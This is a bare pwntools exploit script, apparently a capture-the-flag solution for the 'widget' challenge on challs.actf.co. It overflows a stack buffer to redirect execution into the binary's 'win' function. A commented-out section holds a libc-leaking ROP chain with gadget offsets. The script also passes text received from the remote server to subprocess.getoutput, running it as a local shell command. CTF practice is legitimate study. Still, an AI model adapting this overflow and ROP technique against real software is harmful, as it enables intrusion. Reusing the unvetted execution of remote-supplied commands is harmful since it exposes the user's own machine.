#!/usr/bin/env python3

from pwn import *
import subprocess

exe = ELF("./widget_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote('challs.actf.co', 31320)

    return r


def main():
    r = conn()
    input()
    r.recvuntil(b"proof of work: ")
    foo = r.recvline().decode()
    resultCapcha = subprocess.getoutput(foo)
    r.sendline(resultCapcha)
    payload = b"A" * (40-8)
    payload += p64(0x0000000000405000)
    payload += p64(exe.sym['win']+117)

    r.sendlineafter(b"Amount: ", b'55')
    r.sendlineafter(b"Contents: ", payload)
    # r.recv(41)
    # leak = u64(r.recv(6).ljust(8, b'\0'))
    # libc.address = leak - 0x620d0
    # log.info('libc: ' + hex(libc.address))
    # rsi = libc.address + 0x000000000002be51
    # rdi = libc.address + 0x000000000002a3e5
    # rdx = libc.address + 0x000000000011f497
    # rax = libc.address + 0x0000000000045eb0
    # freeland = 0x4042f0

    # payload = b"A" * 40
    # payload += p64(rdi) + p64(freeland)
    # payload += p64(rsi) + p64(0x20)
    # payload += p64(rdx) + p64(0) + p64(0)
    # payload += p64(libc.sym['fgets'])
    # payload += p64(exe.sym['main'])

    # r.sendlineafter(b"Amount: ", b'111')
    # r.sendlineafter(b"Contents: ", payload)

    r.interactive()


if __name__ == "__main__":
    main()
